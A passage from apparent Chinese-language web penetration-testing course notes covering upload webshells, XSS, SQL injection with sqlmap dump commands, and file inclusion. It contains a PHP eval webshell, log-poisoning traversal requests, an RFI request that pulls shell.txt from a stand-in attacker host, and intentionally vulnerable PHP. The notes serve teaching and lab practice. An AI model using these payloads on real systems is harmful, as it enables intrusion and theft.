class="variable">$upfile</span>[<span class="string">&quot;tmp_name&quot;</span>];<span class="comment">//上传文件的临时存放路径 </span></span><br><span class="line">   </span><br><span class="line"><span class="variable">$error</span>=<span class="variable">$upfile</span>[<span class="string">&quot;error&quot;</span>];<span class="comment">//上传后系统返回的值  </span></span><br><span class="line"><span class="comment">//把上传的临时文件移动到up目录下面 </span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;up/&#x27;</span>.<span class="variable">$name</span>); </span><br><span class="line"><span class="variable">$destination</span>=<span class="string">&quot;up/&quot;</span>.<span class="variable">$name</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$destination</span>;</span><br><span class="line">&#125;  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>实验一：安装OWASP测试环境，在其中的DVWA里实现一句话木马的上传。并用Kail Linux中的自带的webshell工具weevely连接后门，获取服务器权限。</p><p>实验二：点击View Source查看上传文件的源代码，比较三种不同安全级别的代码有什么不同？？思考要做到安全的文件上传，服务端应该从哪些角度对用户上传的文件进行检测。</p><blockquote><p>不再做具体演示，感兴趣可以参考《软件安全：渗漏测试与漏洞挖掘》</p></blockquote><h1 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h1><p>XSS在OWASP 2013年度Web应用程序十大漏洞中位居第三。Web应用程序经常存在XSS漏洞。跨站脚本攻击与SQL注入攻击区别在于：<strong>XSS主要影响的是Web应用程序的用户</strong>，而<strong>SQL注入则主要影响Web应用程序自身</strong>。</p><p><strong>”脚本“的含义</strong></p><p>现在大多数网站都使用JavaScript或VBScript来执行计算、页面格式化、cookie管理以及其他客户动作。这类脚本是在浏览网站的用户的计算机（客户机）上运行的，而不是在Web服务器自身中运行。</p><p>下面是一个简单的脚本示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span> <span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;A script was used to display this text&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在这个简单的实例中，该网页通过JavaScript指示Web浏览器将该文本A script was used to display this text输出。</p><p>浏览该网站的用户不会察觉到本地运行的脚本对网页的内容进行了转换。从浏览器呈现的视图来看，它看上去与静态HTML页面没有任何的区别。只有当用户查看HTML源代码时才可能看到JavaScript。</p><p>大多数浏览器都包含脚本支持，而且通常情况下是默认启用的。</p><p>启用并使用脚本并不是XSS漏洞存在的原因。只有当Web应用程序开发人员犯错误时才会变得危险。</p><h2 id="跨站脚本的含义"><a href="#跨站脚本的含义" class="headerlink" title="跨站脚本的含义"></a>跨站脚本的含义</h2><p>XSS根据其特征和利用手法的不同，主要分成两大类型：</p><ul><li>反射式跨站脚本</li></ul><blockquote><p>反射式跨站脚本也称作非持久型、参数型跨站脚本。主要用于将恶意脚本附加到URL地址的参数中，下面是一个简单的存在漏洞的php页面：</p><p>这个php页面将传入的参数name未经过有效性检验而直接写入到响应结果中，所以这个页面容易受到XSS攻击。</p><p>如果攻击者输入如下脚本:&lt;script&gt;alert(‘xss’)&lt;/script&gt;。传入的脚本在<strong>客户端服务器</strong>中得以执行。此Web应用程序存在可被反射式XSS攻击的漏洞。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]  <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]  <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;    </span><br><span class="line">     <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"> &#125;<span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>存储式跨站脚本</li></ul><blockquote><p>存储式跨站脚本又称为持久型跨站脚本，比反射式跨站脚本更具有威胁性，并且可能影响到Web服务器自身的安全。<br>存储式XSS与反射式XSS类似的地方在于，<strong>会在Web应用程序的网页中显示未经编码的攻击者脚本</strong>。<br>它们的区别在于，存储式XSS中的脚本并非来自于Web应用程序请求；相反，脚本是<strong>由Web应用程序进行存储</strong>的，并且会将其作为内容显示给浏览用户。</p><p>例如，如果论坛或博客网站允许用户上传内容而不进行适当的有效性检查或编码，那么这个网站就容易受到存储式XSS攻击。</p></blockquote><p>在这个示例中，我们向该留言板提交攻击脚本，该脚本会存储在其后台数据库服务器，每当用户查看留言板时，则会弹出对话框：</p><p><img src="/2023/03/17/web-shen-tou-shi-zhan/e9acc0cbf85ce02f641fb015c5ef6432.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/e9acc0cbf85ce02f641fb015c5ef6432.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/17/web-shen-tou-shi-zhan/2e30a8bce51aea8579639aa2f8295759.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/2e30a8bce51aea8579639aa2f8295759.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="XSS的攻击途径"><a href="#XSS的攻击途径" class="headerlink" title="XSS的攻击途径"></a>XSS的攻击途径</h2><p>上面演示的XSS攻击只是显示一个警告框，但是在现实的攻击案例中，攻击者有可能进行更具破坏性的攻击。例如。<strong>恶意脚本可以将cookie值上传到攻击者的网站，从而有可能让攻击者以该用户的身份登入或恢复正在进行中的会话</strong>。脚本还可以改写页面内容，使其看上去已经被涂鸦。</p><p>JavaScript还可以轻易地实施下面的任何攻击：</p><ul><li>通过cookie窃取实现会话劫持</li><li>按键记录，将所有输入的文本发送到攻击者网站</li><li>网站涂改</li><li>向网页中<strong>注入链接或广告</strong></li><li>立即将网页<strong>重定向到恶意网站</strong></li><li>窃取用户登录凭证</li></ul><h2 id="跨站脚本的危害"><a href="#跨站脚本的危害" class="headerlink" title="跨站脚本的危害"></a>跨站脚本的危害</h2><p>一般来说，存储式XSS的风险会高于反射式XSS。因为<strong>存储式XSS会保存在服务器上</strong>，有可能会跨页面存在。它不改变页面URL的原有结构，因此有时候还能逃过一些IDS的检测。比如IE8的XSS Filter和Firefox的Noscript Extension，都会检查地址栏中的地址是否包含XSS脚本。而跨页面的存储式XSS可能会绕过这些检测工具。</p><p>从攻击过程来说，反射式XSS一般要求攻击者<strong>诱使用户点击一个包含XSS代码的URL链接</strong>；而存储式XSS则只需<strong>让用户查看一个正常的URL链接</strong>，而这个链接中存储了一段脚本。比如一个Web邮箱的邮件正文页面存在一个存储式XSS漏洞，当用户打开一封新邮件时，XSS Payload会被执行。这样的漏洞<u>极其隐蔽</u>，且埋伏在用户的正常业务中，风险颇高。</p><p>实验三：对如下示例代码的php网页进行XSS攻击，实现简单的弹窗效果即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">confirm</span>(<span class="string">&quot;Congratulations~&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>--Welcome To The Simple XSS Test--<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str =strtolower( $_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;Hello &quot;.htmlspecialchars($str).&quot;.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=xss_test.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=Submit /&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str4.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不再做具体演示，感兴趣可以参考《软件安全：渗漏测试与漏洞挖掘》</p></blockquote><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>SQL是用于访问和处理数据库的标准的计算机语言。SQL是二十世纪七十年代由IBM创建的，于1992年作为国际标准纳入ANSI。包括数据定义语言（DDL），用于定义数据库结构、数据操作语言（DML），用于对数据库进行查询或更新。 </p><p>SQL语法不过多介绍</p><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的<strong>输入参数</strong>中的攻击，之后再将这些参数传递给后台SQL服务器加以<strong>解析并执行</strong>。</p><p>数据库驱动的Web应用通常包含三层：</p><ul><li>表示层：Web浏览器或呈现引擎</li><li>逻辑层：如C#、ASP、NET、PHP、JSP等编程语言</li><li>存储器：如Microsoft SQL Server、MySQL、Oracle等数据库</li></ul><p>Web浏览器（表示层）向中间层（Web服务器）发送请求，中间层通过查询、更新数据库（存储层）来响应该请求。<br>当用户通过Web表单提交数据时，如果输入框的值没有经过<strong>有效性检查</strong>，则这些数据将会作为SQL查询的一部分。</p><p>比如，如果一个网页的表单通过如下代码实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=”xxx.php”method=”GET”&gt;</span><br><span class="line">&lt;input type=”text” name=”user”/&gt; </span><br><span class="line">&lt;input type=”text” name=”passwd”&gt;</span><br><span class="line">&lt;input type=”submit”/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>核心代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*…*/</span><br><span class="line">$sql=&quot;select * from table where user=$_GET[“user”] and password=$_GET[“passwd”]&quot;;</span><br><span class="line">$result=mysql_query($sql);//执行查询</span><br><span class="line">/*…*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当用户通过浏览器向表单提交了用户名“bob”，密码“abc123”时，那么下面的HTTP查询将被发送给Web服务器：<code>http://xxxx.com/xxx.php?user=bob&amp;passwd=abc123</code></p><p>当Web服务器收到这个请求时，将构建并执行一条（发送给数据库服务器的）SQL查询。在这个示例中，该SQL请求如下所示：<code>SELECT * FROM table WHERE user=’bob’ and password=’abc123’</code></p><p><font color=red>但是，如果用户发送的请求的user是修改过的SQL查询，那么这个模式就可能会导致SQL注入安全漏洞。</font></p><p>例如，如果用户将user的内容以“bob ’–”来提交，则单引号用于截断前面的字符串，注释符–后面的内容将会被注释掉，如下所示：<code>http://xxxx.com/xxx.php?user=bob’--&amp;passwd=xxxxxx</code></p><p>Web应用程序会构建并发送下面这条SQL查询：<code>SELECT * FROM table WHERE user=’bob’--’ and password=’abc123’</code></p><p>这样，注释符–后面的内容将会被完全注释掉，也就是说，对于伪造bob的用户，并不需求提供正确的密码，就可以查询到bob的相关信息。</p><h2 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h2><p>如果要对一个网站进行SQL注入攻击，首先<strong>需要找到存在SQL注入漏洞的地方</strong>，也就是<strong>注入点</strong>。可能的SQL注入点一般存在于<strong>登录页面</strong>、<strong>查找页面或添加页面等用户可以查找或修改数据的地方</strong>。</p><p><strong>get型的请求最容易被注入</strong></p><blockquote><p>通常我们关注ASP,JSP,CGI或PHP的网页，尤其是URL中携带参数的，例如: <a href="http://xxx/xxx.asp?id=numorstring%E3%80%82%E5%85%B6%E4%B8%AD%EF%BC%8C%E5%8F%82%E6%95%B0%E5%8F%AF%E4%BB%A5%E6%98%AF%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%98%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B%E7%9A%84%E3%80%82">http://xxx/xxx.asp?id=numorstring。其中，参数可以是整数类型的也可以是字符串类型的。</a></p><p>我们以数字类型为例，进行以下的讲解。<br>如果下面两个方法能成功，说明存在SQL注入漏洞，也就是他们对输入信息并没有做有效的筛查和处理。</p></blockquote><p>一段有问题的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;lenovo&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$con</span>)&#123;<span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());&#125;</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;products&quot;</span>,<span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from category where id=<span class="subst">$_GET</span>[id]&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>,<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>,MYSQL_NUM))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&quot; &quot;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&quot; &quot;</span>.<span class="variable">$row</span>[<span class="number">2</span>] .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysql_free_result</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>“单引号”法</strong></p><p>在URL参数后添加一个单引号，若存在注入点则通常会返回一个错误，例如，下列错误通常表明存在MySQL注入漏洞： </p><p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1</code></p><p><img src="/2023/03/17/web-shen-tou-shi-zhan/5ea8d32051c1248d10df4ca1721a49c9.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/5ea8d32051c1248d10df4ca1721a49c9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>“永真永假”法</strong></p><p>“单引号”法很直接，也很简单，但是对SQL注入有一定了解的程序员在编写程序时，都会将单引号过滤掉。如果再使用单引号测试，就无法检测到注入点了。这时，就可以使用经典的“永真永假”法。</p><p><img src="/2023/03/17/web-shen-tou-shi-zhan/1246fa8912dd32761d0ec518d94084d3.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/1246fa8912dd32761d0ec518d94084d3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>Sqlmap是一款开源的<strong>命令行自动化SQL注入工具</strong>，用Python开发而成，kali中系统已装有sqlmap；而如果在windows下使用，则需要安装Python环境。下面介绍Sqlmap最为常用的命令：</p><ul><li>Sqlmap -u url找到注入点</li><li>sqlmap -u url –dbs 列出数据库</li><li>或者 sqlmap -u url –current-db<br>显示当前数据库</li><li>sqlmap -u url –users<br>列出数据库用户</li><li>或者sqlmap -u url –current-user<br>当前数据库用户</li><li>sqlmap -u url  –tables -D   “testdb”<br>列出testdb数据库的表</li><li>sqlmap -u url  –columns -T “user” -D “testdb” 列出testdb数据库user表的列</li><li>sqlmap -u url  –dump -C “id,username,password” -T “user” -D “testdb” </li><li>列出testdb数据 库user表的id,username,password这几列的数据</li></ul><h3 id="具体实践"><a href="#具体实践" class="headerlink" title="具体实践"></a>具体实践</h3><p>开放式Web应用程序安全项目(Open Web Application Security Project, OWASP)是世界上最知名的Web安全与数据库安全研究组织，该组织分别在2007年、2010年和2013年统计过十大Web安全漏洞。我们<strong>基于OWASP发布的开源虚拟镜像“OWASP Broken Web Applications VM”</strong>来演示如何寻找SQL注入漏洞。这里不作过多介绍。</p><h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><p>通过工具SQLMap可以轻松的获取数据库的所有表、列和数据，读者可能也有疑惑，它是如何达到目的的呢？<br>有一些SQL注入可以将SQL执行的结果回显，这种情况下，可以直接通过回显的结果来显示想要查询的各类信息。<br>但是，实际情况中，具有回显的注入点非常罕见。在这种情况下就需要利用SQL盲注。</p><p><strong>SQL盲注是不能通过直接显示的途径来获取数据库数据的方法</strong>。在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）。一般情况下，盲注可分为三类：<strong>基于布尔SQL盲注</strong>、<strong>基于时间的SQL盲注</strong>、<strong>基于报错的SQL盲注</strong>。</p><p><strong>常用的SQL函数</strong></p><p><code>Substr函数</code>的用法：取得字符串中指定起始位置和长度的字符串，默认是从起始位置到结束的子串。语法为：substr( string, start_position, [ length ] )，比如substr(‘目标字符串’,开始位置,长度)，再如substr(‘This is a test’, 6, 2) 将返回 ‘is’。</p><p><code>If函数</code>的用法：如果满足一个条件可以赋一个需要的值。语法：IF(expr1,expr2,expr3)，其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果，expr1为真则返回expr2，否则返回expr3。</p><p><code>Sleep函数</code>的用法：sleep(n)让语句停留n秒时间，然后返回0，如果执行被打断，返回1。</p><p><code>Ascii函数</code>的用法：返回字符的ASCII码值。</p><p><strong>基于布尔的SQL盲注</strong></p><p>对于一个注入点，页面只返回True和False两种类型页面，此时可以利用基于布尔的盲注。布尔盲注就是通过判断语句来猜解，如果判断条件正确则页面显示正常，否则报错，这样一轮一轮猜下去直到猜对，是挺麻烦但是相对简单的盲注方式。</p><blockquote><p>实验七：DVWA中的SQL Injection(Blind)实践</p><p>基于时间的SQL盲注重做实验</p><p>不作过多演示</p></blockquote><h2 id="SQL注入的防御措施"><a href="#SQL注入的防御措施" class="headerlink" title="SQL注入的防御措施"></a>SQL注入的防御措施</h2><p>由于越来越多的攻击利用了SQL注入技术，也随之产生了很多试图解决注入漏洞的方案。目前被提出的方案有：</p><ul><li>在服务端正式处理之前对提交数据的合法性进行检查</li></ul><blockquote><p>方案1被公认是最根本的解决方案，<strong>在确认客户端的输入合法之前，服务端拒绝进行关键性的处理操作</strong>，不过这需要开发者能够以一种安全的方式来构建网络应用程序，虽然已有大量针对在网络应用程序开发中如何安全地访问数据库的文档出版，但仍然有很多开发者缺乏足够的安全意识，造成开发出的产品中依旧存在注入漏洞。</p></blockquote><ul><li>封装客户端提交信息</li></ul><blockquote><p>方案2的做法需要RDBMS的支持，目前只有Oracle采用该技术</p></blockquote><ul><li>替换或删除敏感字符/字符串</li></ul><blockquote><p>方案3则是一种不完全的解决措施，例如，当客户端的输入为 “…ccmdmcmdd…”时，在对敏感字符串“cmd”替换删除以后，剩下的字符正好是“…cmd…”。</p></blockquote><ul><li>屏蔽出错信息</li></ul><blockquote><p>方案4是目前最常被采用的方法，很多安全文档都认为SQL注入攻击需要通过错误信息收集信息，有些甚至声称某些特殊的任务若缺乏详细的错误信息则不能完成，这使很多安全专家形成一种观念，即注入攻击在缺乏详细错误的情况下不能实施。而实际上，屏蔽错误信息是在服务端处理完毕之后进行补救，攻击其实已经发生，只是企图阻止攻击者知道攻击的结果而已。</p></blockquote><p><font color=red>通常，上面这些方法需要结合使用</font></p><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>在开发web应用时，开发人员通常会将一些重复使用的代码写到单个文件中，再<strong>通过文件包含，将这些单个文件中的代码插入到其它需要用到它们的页面中</strong>。文件包含可以极大的提高应用开发的效率，减少开发人员的重复工作，有利于代码的维护与版本的更新。</p><ul><li><strong>配置文件</strong>。用于整个web应用的配置信息，如数据库的用户名及密码，使用的数据库名，系统默认的文字编码，是否开启Debug模式等信息。右侧就是wordpress博客系统配置文件的部分内容。</li><li><strong>重复使用的函数</strong>。如连接数据库，过滤用户的输入中的危险字符等。这些函数使用的频率很高，在所有需要与数据库进行交互的地方都要用到相似的连接数据库的代码；在几乎所有涉及到获取用户输入的地方都需要对其进行过滤，以避免出现像sql注入、xss这样的安全问题。</li><li><strong>重复使用的版块</strong>。如页面的页头、页脚以及菜单文件。通过文件包含对这些文件进行引入，在某个地方需要修改时，开发人员只需要对单个文件进行更新即可，而不需要修改使用这些板块的其他文件。</li><li><strong>具有相同框架的不同功能</strong>。开发人员可以在不同的页面引入页头、页脚，也可以在定义好页头、页脚的框架中引入不同的功能。这样有新的业务需求时，开发人员只需要开发对应的功能文件，再通过文件包含引入；在有业务需要更替时，开发人员也只需要删除对应的功能文件即可。</li></ul><p>下面便是一个在相同的框架中引入不同功能的示例代码，该代码可以从get请求中获取到用户需要访问的功能，并且将对应的功能文件包含进来。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Index.php:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[‘func’];</span><br><span class="line"><span class="keyword">include</span> “<span class="variable">$file</span>”;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>如果被包含文件的文件名是从用户处获得的，且没有经过恰当的检测，从而包含了预想之外的文件，导致了文件泄露甚至是恶意代码注入，这就是文件包含漏洞。如果被包含的文件储存在服务器上，那么对于应用来说，<strong>被包含的文件就在本地</strong>，就称之为本地文件包含漏洞。 </p><p><strong>场景一：包含上传的合法文件</strong></p><p>通常应用中都会有文件上传的功能，比如用户头像上传、附件上传等。通过文件上传，攻击者将能携带有恶意代码的合法文件上传到服务器中，<strong>由于在include等语句中，无论被包含文件的后缀名是什么，只要其中有PHP的代码，都会将其执行。</strong>结合文件包含漏洞，可以将上传的恶意文件引入，使其中的恶意代码得到执行。</p><p><strong>场景二：包含日志文件</strong></p><p>Web服务器往往会将用户的请求记录在一个日志文件中，以供系统管理员审查。在Ubuntu系统下，apache默认的日志文件为/var/log/apache2/access.log。日志文件会记录<strong>用户的ip地址、访问的url、访问时间</strong>等信息。</p><p>利用这个功能，攻击者可以：</p><ul><li>先构造一条包含恶意代码的请求，如<code>http://.../index.php?a=&lt;? php eval($_POST[‘pass’]); ?&gt;</code>，这一条请求会被web服务器写入日志文件中</li><li>再利用本地文件包含漏洞，如<code>http://.../index.php?func=..../../log/apache2/access.log</code>，将日志文件引入，使得植入的恶意代码得到执行。</li></ul><p><img src="/2023/03/17/web-shen-tou-shi-zhan/61198b7a61310bb4709ed032ff4e6761.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/61198b7a61310bb4709ed032ff4e6761.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>顾名思义，如果存在文件包含漏洞，且<strong>允许被包含的文件可以通过url获取</strong>，则称为远程文件包含漏洞。<br>在PHP中，有两项关于PHP打开远程文件的设置，<code>allow_url_fopen</code>和<code>allow_url_include</code>：</p><ul><li>allow_url_fopen设置是否允许PHP通过url打开文件，默认为On；</li><li>allow_url_include设置是否允许通过url打开的文件用于include等函数，默认为Off。</li></ul><p>allow_url_fopen是allow_url_include开启的前提条件，只有allow_url_fopen与allow_url_include同时设置为On时，才可能存在远程文件包含漏洞。<br>出于安全考虑，这两个变量的值只能在配置文件php.ini中更改。</p><ol><li>包含攻击者服务器上的恶意文件由于allow_url_fopen与 allow_url_include 是开启的，攻击者可以将包含恶意代码的文件放在自己的服务器上，例如一个内容为<code>&lt;?php eval($_POST[‘pass’]);?&gt;</code>的shell.txt文件，构造恶意请求<code>http://www.victim.com/index.php?func=http://www.hacker.com/shell.txt</code>，<code>shell.txt</code>中的恶意代码就会在目标服务器上执行。</li><li>通过PHP伪协议进行包含在PHP中，如果allow_url_fopen和allow_url_include同时开启的情况下，include等函数支持从PHP伪协议中的php://input处获取输入流，关于PHP伪协议的相关知识会在下面讨论，这里只关注其中的php://input。</li></ol><p>php://input可以访问请求的原始数据的只读流，也就是通过POST方式发送的内容。借助PHP伪协议，攻击者直接将想要在服务器上执行的恶意代码通过POST的方式发送给服务器就能完成攻击。</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" 